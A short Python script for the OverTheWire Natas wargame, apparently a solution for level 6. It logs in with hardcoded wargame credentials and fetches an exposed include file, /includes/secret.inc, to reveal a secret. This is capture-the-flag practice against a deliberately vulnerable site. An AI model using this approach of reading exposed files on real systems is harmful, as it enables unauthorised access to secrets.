import requests
import re

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = 'http://{}.natas.labs.overthewire.org'.format(username)

url += "/includes/secret.inc"
r = requests.get(url, auth=(username, password))
content = r.text


print(content)

#print("the password for next level = ", str(re.findall("The password for natas6 is (.*)<", content)))
